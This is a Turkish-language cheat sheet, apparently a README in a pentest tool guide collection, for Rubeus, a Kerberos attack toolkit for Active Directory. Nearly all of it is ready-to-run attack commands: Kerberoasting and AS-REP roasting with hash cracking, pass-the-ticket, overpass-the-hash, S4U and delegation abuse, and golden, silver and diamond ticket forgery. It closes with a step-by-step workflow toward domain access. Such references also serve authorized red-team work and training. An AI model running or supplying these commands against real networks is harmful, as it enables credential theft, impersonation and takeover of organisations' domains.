# 🎫 Rubeus - Kerberos İstismar Araç Seti Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
             Kerberos Etkileşimi ve İstismarı
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

## 📋 İçindekiler

- [Rubeus Nedir?](#-rubeus-nedir)
- [Bilet İşlemleri (Ticket Operations)](#-bilet-i̇şlemleri-ticket-operations)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [Bilet Tabanlı Saldırılar (Ticket Attacks)](#-bilet-tabanlı-saldırılar-ticket-attacks)
- [Yetkilendirme (Delegation) Saldırıları](#-yetkilendirme-delegation-saldırıları)
- [Golden & Silver Biletler](#-golden--silver-biletler)
- [Hızlı Başvuru](#-hızlı-başvuru)

---

## 🎯 Rubeus Nedir?

**Rubeus**, Kerberos protokolü ile ham düzeyde etkileşim kurmak ve protokol zafiyetlerini istismar etmek için geliştirilmiş C# tabanlı bir araç setidir:

- 🎫 **Bilet İşlemleri** - Bilet isteme, yenileme ve bilet detaylarını inceleme
- 🔓 **Kerberoasting** - Servis hesaplarına ait bilet hashlerini yakalama
- 🔑 **AS-REP Roasting** - Ön kimlik doğrulaması kapalı kullanıcılara saldırma
- 🎭 **Pass-the-Ticket** - Ele geçirilen Kerberos biletlerini oturuma enjekte ederek kullanma
- ✨ **Golden/Silver Tickets** - Sahte TGT veya TGS biletleri üretme

---

## 🚀 Temel Kullanım

### Rubeus'ı Çalıştırma

```powershell
# Doğrudan yürütme
.\Rubeus.exe <komut> [seçenekler]

# Bellekte doğrudan çalıştırma (Cobalt Strike)
execute-assembly Rubeus.exe <komut>

# PowerShell üzerinden belleğe yükleme
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

## 🎟️ Bilet İşlemleri (Ticket Operations)

### TGT İsteme (Request TGT)

```powershell
# Parola ile TGT isteme
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# NTLM hash ile TGT isteme
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# AES256 anahtarı ile TGT isteme
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# Sertifika (.pfx) ile TGT isteme
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Bileti dosyaya kaydetme
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### TGS İsteme (Request TGS)

```powershell
# Servis bileti isteme
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# Dosyada saklanan TGT ile servis bileti isteme
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### Biletleri Listeleme (Triage & Dump)

```powershell
# Geçerli kullanıcının biletlerini listele
.\Rubeus.exe triage

# Sistemdeki tüm biletleri listele (yönetici yetkisi gerektirir)
.\Rubeus.exe triage /luid:0x3e7

# Biletlerin ayrıntılı dökümünü alma
.\Rubeus.exe dump
```

### Pass-the-Ticket (Bilet Enjeksiyonu)

```powershell
# Base64 formatındaki bileti mevcut oturuma aktar
.\Rubeus.exe ptt /ticket:base64ticket

# .kirbi dosyasından bileti mevcut oturuma aktar
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Yeni bir kurban oturumu açıp bileti oraya yükle
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Bilet Bilgilerini İnceleme (Describe Ticket)

```powershell
# Bilet detaylarını görüntüle
.\Rubeus.exe describe /ticket:base64ticket

# Dosyadan bilet detaylarını görüntüle
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

## 🍖 Kerberoasting

### Temel Kerberoasting

```powershell
# Tüm SPN tanımlı kullanıcılar için bilet iste
.\Rubeus.exe kerberoast

# Çıktıyı dosyaya kaydet (Hashcat formatında)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Belirli bir kullanıcıyı hedefle
.\Rubeus.exe kerberoast /user:sqlservice

# RC4 şifreleme indirgemesi (etype 23 - daha kolay kırılır)
.\Rubeus.exe kerberoast /rc4opsec
```

### Gelişmiş Kerberoasting

```powershell
# Belirli bir TGT kullanarak Kerberoast yap
.\Rubeus.exe kerberoast /ticket:base64tgt

# Yalnızca istatistikleri göster (bilet istemez)
.\Rubeus.exe kerberoast /stats

# Belirli bir SPN değerini hedefle
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# AES şifreleme ile iste (daha sessizdir / stealthier)
.\Rubeus.exe kerberoast /aes

# Kullanıcıya göre filtrele ve satır kaydırma yapma
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Kerberoast Hashlerini Kırma

```bash
# Hashcat (mod 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John the Ripper
john --wordlist=rockyou.txt kerberoast.txt
```

---

## 🔓 AS-REP Roasting

### Temel AS-REP Roasting

```powershell
# Ön kimlik doğrulama gerektirmeyen kullanıcıları bul ve roast et
.\Rubeus.exe asreproast

# Çıktıyı dosyaya kaydet
.\Rubeus.exe asreproast /outfile:asrep.txt

# Belirli bir kullanıcıyı hedefle
.\Rubeus.exe asreproast /user:targetuser

# Hashcat formatında çıktı al
.\Rubeus.exe asreproast /format:hashcat
```

### AS-REP Hashlerini Kırma

```bash
# Hashcat (mod 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## 🎭 Bilet Tabanlı Saldırılar (Ticket Attacks)

### Overpass-the-Hash (Pass-the-Key)

```powershell
# NTLM hash ile TGT al ve mevcut oturuma uygula (/ptt)
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# AES anahtarı ile
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Sahte (sacrificial) bir oturum başlatıp bileti oraya aktarma
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U (Service for User) İstismarı

```powershell
# S4U2Self - Kullanıcıyı kendi servisi adına taklit etme
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy - Başka bir servise karşı taklit etme
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Tam zincirleme istismar ve oturuma aktarma
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 🔀 Yetkilendirme (Delegation) Saldırıları

### Kısıtlamasız Yetkilendirme (Unconstrained Delegation)

```powershell
# Kısıtlamasız yetkilendirmeye sahip konakta gelen TGT'leri izleme
.\Rubeus.exe monitor /interval:5 /nowrap

# Belirli bir hedef için izleme
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Bellekteki TGT'leri toplama (harvesting)
.\Rubeus.exe harvest /interval:30
```

### Kısıtlı Yetkilendirme (Constrained Delegation)

```powershell
# İzin verilen servis için bilet talep etme
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Kaynak Tabanlı Kısıtlı Yetkilendirme (RBCD)

```powershell
# PowerMad/PowerView ile RBCD yapılandırıldıktan sonra
# Saldırgan makine hesabı üzerinden bilet talep etme
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## ✨ Golden & Silver Biletler

### Golden Ticket (Altın Bilet)

```powershell
# Altın bilet oluştur (krbtgt hash gerektirir)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Ek yetkili grupları belirtme
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# AES anahtarı ile altın bilet oluşturma
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket (Gümüş Bilet)

```powershell
# Gümüş bilet oluştur (hedef servis hesabının hash değerini gerektirir)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# LDAP servisi için gümüş bilet (DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket (Elmas Bilet)

```powershell
# Yasal bir TGT'nin PAC alanını manipüle ederek üretilen elmas bilet
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

## 📊 Hızlı Başvuru

### Temel Komutlar

| Komut | Açıklama |
|-------|----------|
| `asktgt` | TGT talep et |
| `asktgs` | TGS talep et |
| `kerberoast` | Servis hesabı bilet hashlerini yakala |
| `asreproast` | Ön kimlik doğrulamasız hesapları roast et |
| `ptt` | Bileti oturuma enjekte et (Pass-the-Ticket) |
| `s4u` | Service for User istismarı |
| `golden` | Sahte altın bilet (TGT) üret |
| `silver` | Sahte gümüş bilet (TGS) üret |
| `dump` | Sistemdeki tüm biletleri dök |
| `triage` | Oturumdaki biletleri listele |

### Kimlik Doğrulama Seçenekleri

| Seçenek | Açıklama |
|---------|----------|
| `/user:` | Kullanıcı adı |
| `/password:` | Parola |
| `/rc4:` | NTLM hash değeri |
| `/aes256:` | AES256 anahtarı |
| `/ticket:` | Base64 kodlanmış bilet verisi |

### Yaygın Seçenekler

| Seçenek | Açıklama |
|---------|----------|
| `/ptt` | Bileti mevcut oturuma doğrudan uygula |
| `/outfile:` | Çıktıyı dosyaya yaz |
| `/nowrap` | Base64 çıktılarda satır kaydırma yapma |
| `/domain:` | Hedef etki alanı |
| `/dc:` | Hedef etki alanı denetleyicisi |

### Tipik Saldırı İş Akışı

```powershell
# 1. Kerberoasting gerçekleştir
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Hashleri kır
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Kırılan parola ile TGT talep et ve oturuma enjekte et
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Veya overpass-the-hash kullan
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Kaynaklara eriş
dir \\server\share
```

---

## 📚 Kaynaklar

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### İlgili Kılavuzlar
- [BloodHound](../../BloodHound/translations/README.tr.md)
- [Impacket](../../Impacket/translations/README.tr.md)
- [Mimikatz](../../Mimikatz/translations/README.tr.md)

---

<p align="center">
  <b>🎫 Kerberos Protokolünde Uzmanlaşın!</b><br>
  <i>Rubeus - Domain Admin yetkisine giden biletiniz</i>
</p>
